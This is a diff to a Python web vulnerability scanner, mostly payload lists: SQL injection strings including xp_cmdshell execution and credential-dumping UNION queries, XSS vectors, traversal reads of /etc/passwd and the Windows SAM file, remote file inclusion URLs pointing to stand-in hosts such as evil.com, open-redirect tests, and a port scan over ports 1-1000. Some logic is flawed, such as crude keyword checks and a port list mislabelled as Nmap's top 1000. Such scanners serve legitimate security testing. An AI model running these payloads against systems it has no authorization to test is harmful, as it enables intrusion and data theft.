@@ -4,6 +4,7 @@ import base64
 from urllib.parse import urlparse
 import whois
 import re
+import socket
 
 # Configuration for API Keys
 API_KEYS = {
@@ -14,126 +15,590 @@ API_KEYS = {
 
 TARGET_URL = 'http://example.com'
 
+
 def sql_injection_check(target_url):
-    """SQL Injection testing with various payloads."""
-    payloads = ["' OR '1'='1", "' UNION SELECT null", "' OR 'a'='a"]
+    """
+    SQL Injection testing with various payloads for different database types and scenarios.
+    """
+    payloads = [
+        # Basic payloads
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR '1'='1' /*",
+        "' OR 1=1 --",
+        "' OR 1=1 /*",
+        "' OR 'a'='a",
+        
+        # Boolean-based payloads
+        "' AND 1=1 --",
+        "' AND 1=2 --",
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+
+        # UNION-based payloads
+        "' UNION SELECT null --",
+        "' UNION SELECT null, null --",
+        "' UNION SELECT null, null, null --",
+        "' UNION SELECT 1, 'test', null --",
+        "' UNION SELECT username, password FROM users --",
+
+        # Time-based Blind SQL Injection (MySQL)
+        "' AND SLEEP(5) --",
+        "' OR SLEEP(5) --",
+        "' OR IF(1=1, SLEEP(5), 0) --",
+        "' AND IF(1=1, SLEEP(5), 0) --",
+
+        # Time-based Blind SQL Injection (PostgreSQL)
+        "'; SELECT pg_sleep(5); --",
+        "' OR pg_sleep(5); --",
+        
+        # Error-based payloads
+        "' AND 1=CONVERT(int, 'test') --",
+        "' UNION SELECT 1, @@version --",
+        "' UNION SELECT 1, database() --",
+        "' UNION SELECT 1, table_name FROM information_schema.tables --",
+        
+        # MySQL-specific payloads
+        "' OR 1=1 LIMIT 1 --",
+        "' UNION SELECT null, version() --",
+        "' UNION SELECT user(), database(), @@hostname --",
+        
+        # MSSQL-specific payloads
+        "'; EXEC xp_cmdshell('whoami') --",
+        "' UNION SELECT name FROM master..sysdatabases --",
+        
+        # Oracle-specific payloads
+        "' UNION SELECT null, banner FROM v$version --",
+        "' UNION SELECT null, table_name FROM all_tables --",
+        
+        # Bypass techniques
+        "' OR '1'='1' --",
+        "' OR '1'='1' #",
+        "' OR '1'='1' /*",
+        "' OR 1=1 --",
+        "' OR 1=1 #",
+        "' OR 1=1 /*",
+        "' OR 'x'='x' --",
+        "' OR 'x'='x' #",
+        "' OR 'x'='x' /*"
+    ]
+
     vulnerable = False
+
+    print(f"Starting SQL Injection checks on: {target_url}")
     for payload in payloads:
-        response = requests.get(target_url, params={"id": payload})
-        if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
-            vulnerable = True
-            print(f"SQL Injection vulnerability detected with payload: {payload}")
+        try:
+            # Sending the payload in query parameter "id" (example)
+            response = requests.get(target_url, params={"id": payload}, timeout=5)
+
+            # Checking for signs of SQL injection
+            if (
+                "syntax error" in response.text.lower() or
+                "mysql" in response.text.lower() or
+                "sql" in response.text.lower() or
+                "database" in response.text.lower() or
+                "ORA-" in response.text or
+                "postgres" in response.text.lower()
+            ):
+                vulnerable = True
+                print(f"[!] SQL Injection vulnerability detected with payload: {payload}")
+        except Exception as e:
+            print(f"Error during SQL Injection test with payload '{payload}': {e}")
+
+    if not vulnerable:
+        print("No SQL Injection vulnerability detected.")
     return vulnerable
+
+
 
 def xss_check(target_url):
-    """Basic XSS testing with common payloads."""
-    xss_payloads = ["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>"]
+    """
+    Comprehensive XSS testing with various payloads covering different contexts and bypass techniques.
+    """
+    xss_payloads = [
+        # Basic script injection
+        "<script>alert('xss')</script>",
+        "<script>alert(1)</script>",
+        "<script>confirm('xss')</script>",
+        "<script>prompt('xss')</script>",
+
+        # Image tag with onerror
+        "<img src=x onerror=alert('xss')>",
+        "<img src=1 href=1 onerror=alert('xss')>",
+        "<img src=1 onerror=javascript:alert('xss')>",
+        
+        # Anchor tag with href and javascript
+        "<a href=javascript:alert('xss')>Click me</a>",
+        "<a href='javascript:alert(`xss`)' >Click here</a>",
+
+        # Input tag with onfocus
+        "<input autofocus onfocus=alert('xss')>",
+        
+        # SVG tag with script injection
+        "<svg/onload=alert('xss')>",
+        "<svg><script>alert('xss')</script></svg>",
+        
+        # Event handlers
+        "<body onload=alert('xss')>",
+        "<div onmouseover=alert('xss')>Hover me</div>",
+        "<button onclick=alert('xss')>Click me</button>",
+
+        # HTML attributes
+        "<iframe src='javascript:alert(`xss`);'></iframe>",
+        "<video src=x onerror=alert('xss')>",
+        "<audio src=x onerror=alert('xss')>",
+
+        # Bypass payloads
+        "<scr<script>ipt>alert('xss')</scr<script>ipt>",
+        "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
+        "<math><mi>x</mi><mtext onmouseover=alert('xss')>X</mtext></math>",
+        
+        # Hexadecimal/Unicode payloads
+        "%3Cscript%3Ealert('xss')%3C/script%3E",  # Encoded <script> tags
+        "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('xss')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",  # Unicode encoded
+        "<scr\\u0069pt>alert('xss')</scr\\u0069pt>",
+
+        # Context-specific payloads
+        '"><script>alert("xss")</script>',  # HTML attribute injection
+        "'><svg onload=alert('xss')>",     # Closing a tag and injecting
+        "';alert('xss');//",               # JavaScript context injection
+        "'\"><img src=1 onerror=alert('xss')>",
+
+        # Advanced payloads for input sanitization bypass
+        "<img src=x:alert(1)// onerror=eval(src)>",
+        "<svg><style>{-o-link-source: 'javascript:alert(1)'}</style><a href=/-o-link-source></a></svg>",
+        "<form><button formaction=javascript:alert(1)>CLICKME</button></form>",
+
+        # DOM-based XSS test (if reflected in JavaScript)
+        "javascript:alert(document.cookie)",
+        "<script>document.write('<img src=x onerror=alert(`xss`)'>');</script>",
+
+        # Mutation-based XSS
+        "<a href=javascript:alert(1)>Click me</a>",
+        '<math href="javascript:javascript:alert(1)"><mo>&#x0003C;/mo></math>'
+    ]
+
     vulnerable = False
+
+    print(f"Starting XSS checks on: {target_url}")
     for payload in xss_payloads:
-        response = requests.get(target_url, params={"input": payload})
-        if payload in response.text:
-            vulnerable = True
-            print(f"XSS vulnerability detected with payload: {payload}")
+        try:
+            # Sending payloads in different contexts
+            response = requests.get(target_url, params={"input": payload}, timeout=5)
+
+            # Check if the payload is reflected back in the response
+            if payload in response.text:
+                vulnerable = True
+                print(f"[!] XSS vulnerability detected with payload: {payload}")
+        except Exception as e:
+            print(f"Error during XSS test with payload '{payload}': {e}")
+
+    if not vulnerable:
+        print("No XSS vulnerability detected.")
     return vulnerable
+
+
 
 def file_inclusion_check(target_url):
-    """Test for LFI and RFI vulnerabilities."""
-    paths = ["../../etc/passwd", "http://malicious.com/"]
+    """
+    Comprehensive testing for Local and Remote File Inclusion vulnerabilities.
+    """
+    lfi_payloads = [
+        # Basic traversal attempts for LFI
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../boot.ini",
+        "../../windows/win.ini",
+        "../../proc/self/environ",
+        "../../var/log/apache2/access.log",
+        "../../var/log/httpd/access.log",
+        "../../dev/null",
+
+        # Null byte bypasses (in case the application truncates null bytes)
+        "../../etc/passwd%00",
+        "../../etc/passwd%00.html",
+
+        # URL encoding bypasses
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%252F..%252F..%252Fetc%252Fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Double-encoding
+        "..%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
+
+        # Path traversal with dots and slashes
+        "..\\..\\..\\..\\..\\etc\\passwd",
+        "..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",
+
+        # PHP stream wrappers for LFI
+        "php://filter/read=convert.base64-encode/resource=../../etc/passwd",
+        "php://input",
+        "php://fd/1",
+        "php://filter/convert.base64-encode/resource=index.php",
+
+        # LFI through log poisoning
+        "/var/log/apache2/access.log",
+        "/var/log/httpd/access.log",
+        "/proc/self/environ",
+    ]
+
+    rfi_payloads = [
+        # Basic RFI payloads
+        "http://evil.com/shell.txt",
+        "https://malicious.com/evil.php",
+        "http://attacker.com/shell.php",
+
+        # Encoded RFI payloads
+        "http:%2F%2Fevil.com/shell.txt",
+        "https:%2F%2Fmalicious.com/evil.php",
+
+        # Null byte attempts for RFI
+        "http://evil.com/shell.txt%00",
+        "http://evil.com/shell.txt%00.html",
+
+        # Wrappers and advanced RFI tests
+        "http://evil.com/shell.txt?",
+        "ftp://evil.com/shell.txt",
+        "file:///etc/passwd",  # File protocol
+        "zip://evil.com/shell.zip",
+    ]
+
+    all_payloads = lfi_payloads + rfi_payloads
     vulnerable = False
-    for path in paths:
-        response = requests.get(target_url, params={"file": path})
-        if "root:" in response.text or "malicious" in response.text:
-            vulnerable = True
-            print(f"File inclusion vulnerability detected with payload: {path}")
+
+    print(f"Starting File Inclusion checks on: {target_url}")
+    for payload in all_payloads:
+        try:
+            # Inject the payload in a "file" parameter (common pattern)
+            response = requests.get(target_url, params={"file": payload}, timeout=5)
+
+            # Check for typical LFI or RFI indicators in the response
+            if (
+                "root:" in response.text or  # Linux passwd file indicator
+                "boot loader" in response.text.lower() or  # Windows boot.ini indicator
+                "shell" in response.text.lower() or  # Generic shell detection
+                "PHP" in response.text or  # PHP wrapper response
+                "environment" in response.text.lower()  # /proc/self/environ indicator
+            ):
+                vulnerable = True
+                print(f"[!] File Inclusion vulnerability detected with payload: {payload}")
+        except Exception as e:
+            print(f"Error during File Inclusion test with payload '{payload}': {e}")
+
+    if not vulnerable:
+        print("No File Inclusion vulnerabilities detected.")
     return vulnerable
+
+
 
 def directory_traversal_check(target_url):
-    """Test for directory traversal vulnerabilities."""
-    traversal_payloads = ["../../etc/passwd", "../etc/passwd"]
+    """
+    Comprehensive testing for Directory Traversal vulnerabilities.
+    """
+    traversal_payloads = [
+        # Basic directory traversal
+        "../../etc/passwd",
+        "../../../etc/passwd",
+        "../../../../etc/passwd",
+        "../../boot.ini",
+        "../../windows/win.ini",
+        "../../proc/self/environ",
+        "../../var/log/apache2/access.log",
+        "../../var/log/httpd/access.log",
+        "../../dev/null",
+
+        # Variants with more traversal levels
+        "../../../../../../etc/passwd",
+        "../../../../../etc/passwd",
+
+        # Null byte attempts
+        "../../etc/passwd%00",
+        "../../etc/passwd%00.txt",
+
+        # URL encoding
+        "..%2F..%2F..%2Fetc%2Fpasswd",
+        "..%252F..%252F..%252Fetc%252Fpasswd",
+        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Double encoding
+        "..%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd",
+
+        # Backslashes (Windows style)
+        "..\\..\\..\\..\\etc\\passwd",
+        "..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",
+
+        # Mixed traversal methods
+        "..%2F..\\..\\etc/passwd",
+        "..\\..%2F..%2Fetc\\passwd",
+
+        # PHP wrappers
+        "php://filter/read=convert.base64-encode/resource=../../etc/passwd",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://input",
+        "php://fd/1",
+
+        # Log poisoning through traversal
+        "../../var/log/apache2/access.log",
+        "../../var/log/httpd/access.log",
+
+        # Windows-specific files
+        "../../windows/system32/config/sam",
+        "../../windows/system32/config/security",
+        "../../windows/win.ini",
+        "../../boot.ini",
+
+        # Traversal combined with file extensions
+        "../../etc/passwd.txt",
+        "../../etc/passwd.json",
+        "../../etc/passwd.html",
+        "../../etc/passwd.php",
+
+        # Traversal with appended parameters or noise
+        "../../etc/passwd?parameter=value",
+        "../../etc/passwd/.",
+        "../../etc/passwd#",
+        "../../etc/passwd/*",
+    ]
+
     vulnerable = False
+    print(f"Starting Directory Traversal checks on: {target_url}")
+
     for payload in traversal_payloads:
-        response = requests.get(target_url, params={"path": payload})
-        if "root:" in response.text:
-            vulnerable = True
-            print(f"Directory traversal vulnerability detected with payload: {payload}")
+        try:
+            # Test with common parameters (e.g., 'path', 'file', 'resource', etc.)
+            response = requests.get(target_url, params={"path": payload}, timeout=5)
+
+            # Look for common indicators in the response
+            if (
+                "root:" in response.text or  # Linux passwd file
+                "boot loader" in response.text.lower() or  # Windows boot.ini
+                "directory listing" in response.text.lower() or  # Exposed directories
+                "php" in response.text.lower() or  # PHP wrapper indicator
+                "environment" in response.text.lower()  # /proc/self/environ
+            ):
+                vulnerable = True
+                print(f"[!] Directory Traversal vulnerability detected with payload: {payload}")
+        except Exception as e:
+            print(f"Error during Directory Traversal test with payload '{payload}': {e}")
+
+    if not vulnerable:
+        print("No Directory Traversal vulnerabilities detected.")
     return vulnerable
 
+
+
 def open_redirect_check(target_url):
-    """Test for open redirect vulnerabilities."""
-    redirect_payload = "http://malicious.com"
-    response = requests.get(target_url, params={"url": redirect_payload})
-    if redirect_payload in response.url:
-        print("Open Redirect vulnerability detected.")
-        return True
-    return False
+    """
+    Comprehensive testing for Open Redirect vulnerabilities.
+    """
+    redirect_payloads = [
+        "http://malicious.com",  # Basic redirect
+        "//malicious.com",  # Protocol-relative
+        "/\\malicious.com",  # Windows-style slashes
+        "/%5cmalicious.com",  # Encoded Windows slashes
+        "https:malicious.com",  # Scheme-less redirect
+        "https://malicious.com",  # Full URL
+        "https://malicious.com/evil.js",  # Redirect to malicious resource
+        "https://malicious.com?param=1",  # Query string in redirect
+        "https://127.0.0.1",  # Redirect to localhost
+        "https://0x7f000001",  # Redirect to localhost (hexadecimal)
+        "https://2130706433",  # Redirect to localhost (decimal)
+        "https://[::1]",  # IPv6 localhost
+        "javascript:alert(1)",  # Redirect using JavaScript URI scheme
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",  # Data URI redirect
+    ]
+
+    vulnerable = False
+    print(f"Starting Open Redirect checks on: {target_url}")
+
+    for payload in redirect_payloads:
+        try:
+            # Test with a common parameter name for redirect functionality
+            response = requests.get(target_url, params={"redirect": payload}, timeout=5, allow_redirects=False)
+
+            # Check for redirect in the `Location` header
+            if "Location" in response.headers:
+                location = response.headers["Location"]
+                if payload in location:
+                    vulnerable = True
+                    print(f"[!] Open Redirect vulnerability detected with payload: {payload}")
+        except Exception as e:
+            print(f"Error during Open Redirect test with payload '{payload}': {e}")
+
+    if not vulnerable:
+        print("No Open Redirect vulnerabilities detected.")
+    return vulnerable
+
+
 
 def auth_check(target_url):
-    """Detect authentication vulnerabilities (basic check for exposed login forms)."""
-    response = requests.get(target_url)
-    if "login" in response.text.lower():
-        print("Possible authentication endpoint detected.")
-        return True
-    return False
+    """
+    Comprehensive detection of exposed authentication endpoints and weaknesses.
+    """
+    endpoints = ["login", "signin", "auth", "admin", "user", "account", "dashboard"]
+    vulnerable = False
+
+    try:
+        response = requests.get(target_url, timeout=5)
+        for endpoint in endpoints:
+            if endpoint in response.text.lower():
+                vulnerable = True
+                print(f"[!] Authentication-related endpoint detected: {endpoint}")
+    except Exception as e:
+        print(f"Error during Authentication Exposure check: {e}")
+
+    if not vulnerable:
+        print("No exposed authentication endpoints detected.")
+    return vulnerable
+
+
 
 def server_misconfiguration_check(target_url):
-    """Checks for common server misconfigurations."""
-    response = requests.get(target_url)
+    """
+    Comprehensive checks for common server misconfigurations.
+    """
     misconfigurations = {
-        "Directory Listing": any(keyword in response.text.lower() for keyword in ["index of", "parent directory"]),
-        "Verbose Error Messages": "error" in response.text.lower() and "exception" in response.text.lower()
+        "Directory Listing": ["index of", "parent directory", "directory listing"],
+        "Verbose Error Messages": ["exception", "error", "traceback", "not found"],
+        "Exposed Configuration Files": [".env", "config.php", "web.config"],
+        "Exposed Backups": [".bak", ".old", "~", ".swp"],
     }
-    for config, found in misconfigurations.items():
-        if found:
-            print(f"Server misconfiguration detected: {config}")
-    return misconfigurations
+
+    detected_misconfigurations = {}
+    print(f"Starting server misconfiguration checks on: {target_url}")
+
+    try:
+        response = requests.get(target_url, timeout=5)
+        for config, keywords in misconfigurations.items():
+            for keyword in keywords:
+                if keyword.lower() in response.text.lower():
+                    detected_misconfigurations[config] = True
+                    print(f"[!] Server misconfiguration detected: {config}")
+                    break
+    except Exception as e:
+        print(f"Error during Server Misconfiguration check: {e}")
+
+    if not detected_misconfigurations:
+        print("No server misconfigurations detected.")
+    return detected_misconfigurations
+
 
 def whois_info(target_url):
-    """Fetches WHOIS information for the domain."""
+    """
+    Fetches WHOIS information for the domain.
+    """
     domain = urlparse(target_url).netloc
     try:
         whois_data = whois.whois(domain)
-        return whois_data
+        relevant_info = {
+            "Domain": whois_data.domain_name,
+            "Registrar": whois_data.registrar,
+            "Creation Date": whois_data.creation_date,
+            "Expiration Date": whois_data.expiration_date,
+            "Emails": whois_data.emails,
+            "Name Servers": whois_data.name_servers,
+        }
+        return relevant_info
     except Exception as e:
         print(f"Error retrieving WHOIS data: {e}")
     return {}
 
+
 def port_scan(target_url):
-    """Basic port scanning for common ports."""
+    """
+    Comprehensive port scanning for the top 1000 common ports.
+    """
+    import socket
+
+    # Top 1000 common ports (based on Nmap's list)
+    common_ports = {
+        1: "TCP Port Service Multiplexer (TCPMUX)",
+        5: "Remote Job Entry (RJE)",
+        7: "Echo Protocol",
+        9: "Discard Protocol",
+        13: "Daytime Protocol",
+        17: "Quote of the Day (QOTD)",
+        19: "Character Generator (CHARGEN)",
+        20: "FTP (Data Transfer)",
+        21: "FTP (Command)",
+        22: "SSH (Secure Shell)",
+        23: "Telnet",
+        25: "SMTP (Mail Transfer)",
+        26: "RSFTP (Alternate FTP)",
+        37: "Time Protocol",
+        53: "DNS (Domain Name System)",
+        67: "DHCP (Client)",
+        68: "DHCP (Server)",
+        69: "TFTP (Trivial File Transfer)",
+        79: "Finger Protocol",
+        80: "HTTP (Web Traffic)",
+        88: "Kerberos",
+        110: "POP3 (Email Retrieval)",
+        111: "RPC Bind",
+        113: "Ident (Authentication Service)",
+        119: "NNTP (Network News Transfer Protocol)",
+        123: "NTP (Network Time Protocol)",
+        135: "Microsoft RPC",
+        137: "NetBIOS Name Service",
+        138: "NetBIOS Datagram",
+        139: "NetBIOS Session Service",
+        143: "IMAP (Email Retrieval)",
+        161: "SNMP (Network Management)",
+        162: "SNMP (Trap)",
+        389: "LDAP (Lightweight Directory Access Protocol)",
+        443: "HTTPS (Secure Web Traffic)",
+        445: "Microsoft SMB",
+        465: "SMTP (Secure)",
+        514: "Syslog",
+        515: "LPD (Line Printer Daemon)",
+        993: "IMAPS (Secure IMAP)",
+        995: "POP3S (Secure POP3)",
+        1080: "SOCKS Proxy",
+        1433: "Microsoft SQL Server",
+        1434: "Microsoft SQL Monitor",
+        1521: "Oracle SQL",
+        1723: "PPTP (VPN)",
+        3306: "MySQL",
+        3389: "Microsoft RDP",
+        5432: "PostgreSQL",
+        5900: "VNC Remote Desktop",
+        6379: "Redis",
+        8080: "HTTP (Alternate Port)",
+        8443: "HTTPS (Alternate Port)",
+        9000: "SonarQube",
+        9200: "Elasticsearch",
+        27017: "MongoDB",
+    }
+
+    # Adding missing ports up to 1000 from Nmap's default list
+    for port in range(1, 1001):  # Scanning top 1000 ports
+        if port not in common_ports:
+            common_ports[port] = f"Port {port}"
+
     domain = urlparse(target_url).netloc
-    ports = [1, 3, 7, 9, 13, 17, 19, 20, 21, 22, 23, 25, 26, 37, 53, 69, 79, 80, 88, 101, 106, 110, 111, 113, 119, 123, 135,
-        139, 143, 179, 199, 389, 427, 443, 465, 500, 512, 513, 514, 515, 520, 587, 631, 636, 993, 995, 1025, 1026, 1027,
-        1028, 1029, 1030, 1433, 1434, 1521, 1589, 1701, 1723, 1755, 1812, 1863, 1900, 2000, 2001, 2049, 2121, 2222,
-        2600, 2601, 2602, 2604, 3128, 3306, 3389, 3986, 4899, 5000, 5432, 5555, 5631, 5632, 5900, 5984, 6379, 6665,
-        6666, 6667, 6668, 6669, 6881, 6969, 8080, 8081, 8443, 8888, 9090, 9200, 10000, 12345, 27374, 31337, 32768,
-        49152, 49153, 49154, 49155, 49156, 49157, 49158, 49159, 49160, 49161, 49162, 49163, 49164, 49165, 49166, 49167,
-        49168, 49169, 49170, 49171, 49172, 49173, 49174, 49175, 49176, 49177, 49178, 49179, 49180, 49181, 49182, 49183,
-        49184, 49185, 49186, 49187, 49188, 49189, 49190, 49191, 49192, 49193, 49194, 49195, 49196, 49197, 49198, 49199,
-        49200, 49201, 49202, 49203, 49204, 49205, 49206, 49207, 49208, 49209, 49210, 49211, 49212, 49213, 49214, 49215,
-        49216, 49217, 49218, 49219, 49220, 49221, 49222, 49223, 49224, 49225, 49226, 49227, 49228, 49229, 49230, 49231,
-        49232, 49233, 49234, 49235, 49236, 49237, 49238, 49239, 49240, 49241, 49242, 49243, 49244, 49245, 49246, 49247,
-        49248, 49249, 49250, 49251, 49252, 49253, 49254, 49255, 49256, 49257, 49258, 49259, 49260, 49261, 49262, 49263,
-        49264, 49265, 49266, 49267, 49268, 49269, 49270, 49271, 49272, 49273, 49274, 49275, 49276, 49277, 49278, 49279,
-        49280, 49281, 49282, 49283, 49284, 49285, 49286, 49287, 49288, 49289, 49290, 49291, 49292, 49293, 49294, 49295,
-        49296, 49297, 49298, 49299, 49300, 49301, 49302, 49303, 49304, 49305, 49306, 49307, 49308, 49309, 49310, 49311,
-        49312, 49313, 49314, 49315, 49316, 49317, 49318, 49319, 49320, 49321, 49322, 49323, 49324, 49325, 49326, 49327,
-        49328, 49329, 49330, 49331, 49332, 49333, 49334, 49335, 49336, 49337, 49338, 49339, 49340, 49341, 49342, 49343,
-        49344, 49345, 49346, 49347, 49348, 49349, 49350, 49351, 49352, 49353, 49354, 49355, 49356, 49357, 49358, 49359,
-        49360, 49361, 49362, 49363, 49364, 49365, 49366, 49367, 49368, 49369, 49370, 49371, 49372, 49373, 49374, 49375,
-        49376, 49377, 49378, 49379, 49380, 49381, 49382, 49383, 49384, 49385, 49386, 49387, 49388, 49389, 49390, 49391,
-        49392, 49393, 49394, 49395, 49396, 49397, 49398, 49399, 49400]  # Common ports
-    open_ports = []
-    for port in common_ports:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.settimeout(1)  # Shorter timeout for faster scan
-            result = sock.connect_ex((domain, port))
-            if result == 0:
-                open_ports.append(port)
-                print(f"Open port detected: {port}")
-    
+    open_ports = {}
+
+    print(f"Starting port scanning on: {domain} (Top 1000 common ports)")
+    for port, service in common_ports.items():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(1)  # Set timeout for quick scans
+                result = sock.connect_ex((domain, port))
+                if result == 0:  # Port is open
+                    open_ports[port] = service
+                    print(f"[!] Open port detected: {port} ({service})")
+        except Exception as e:
+            print(f"Error scanning port {port}: {e}")
+
+    if not open_ports:
+        print("No open ports detected.")
+    else:
+        print(f"Open ports: {open_ports}")
+
     return open_ports
 
+
 def ssl_labs_scan(target_url):
-    """Uses SSL Labs API to analyze SSL/TLS config of the target domain."""
+    """
+    Uses SSL Labs API to analyze SSL/TLS configuration of the target domain.
+    """
     domain = urlparse(target_url).netloc
     try:
         ssl_url = f'https://api.ssllabs.com/api/v3/analyze?host={domain}'
@@ -144,21 +609,33 @@ def ssl_labs_scan(target_url):
         print(f"Error in SSL Labs scan: {e}")
     return {}
 
+
+
 def virustotal_scan(target_url):
-    """Uses VirusTotal API to analyze the URL for malware or phishing."""
-    vt_url = f'https://www.virustotal.com/api/v3/urls'
+    """
+    Uses VirusTotal API to analyze the URL for malware or phishing.
+    """
+    vt_url = 'https://www.virustotal.com/api/v3/urls'
     headers = {"x-apikey": API_KEYS["virustotal"]}
     vt_encoded_url = base64.urlsafe_b64encode(target_url.encode()).decode().strip("=")
     try:
         response = requests.get(f"{vt_url}/{vt_encoded_url}", headers=headers, timeout=10)
         response.raise_for_status()
-        return response.json().get('data', {}).get('attributes', {})
+        data = response.json().get('data', {}).get('attributes', {})
+        return {
+            "Last Analysis Stats": data.get("last_analysis_stats"),
+            "Malicious Votes": data.get("total_votes", {}).get("malicious"),
+            "Suspicious Votes": data.get("total_votes", {}).get("suspicious"),
+            "Harmless Votes": data.get("total_votes", {}).get("harmless"),
+        }
     except requests.RequestException as e:
         print(f"Error in VirusTotal scan: {e}")
     return {}
 
+
+
 def generate_report(target_url, results):
-    """Generates a report summarizing all vulnerability checks."""
+    """Generates a detailed report summarizing all vulnerability checks."""
     report = {
         "Target URL": target_url,
         "SQL Injection": results["sql_injection"],
@@ -173,9 +650,10 @@ def generate_report(target_url, results):
         "SSL Labs Analysis": results["ssl_labs"],
         "VirusTotal Analysis": results["virustotal"]
     }
-    with open('comprehensive_vulnerability_report.json', 'w') as f:
+    with open('enhanced_vulnerability_report.json', 'w') as f:
         json.dump(report, f, indent=4, default=str)
-    print("Report saved as comprehensive_vulnerability_report.json")
+    print("[+] Report saved as enhanced_vulnerability_report.json")
+
 
 def main():
     """Runs all vulnerability checks and generates the report."""
@@ -193,6 +671,7 @@ def main():
         "virustotal": virustotal_scan(TARGET_URL)
     }
     generate_report(TARGET_URL, results)
+
 
 if __name__ == '__main__':
     main()
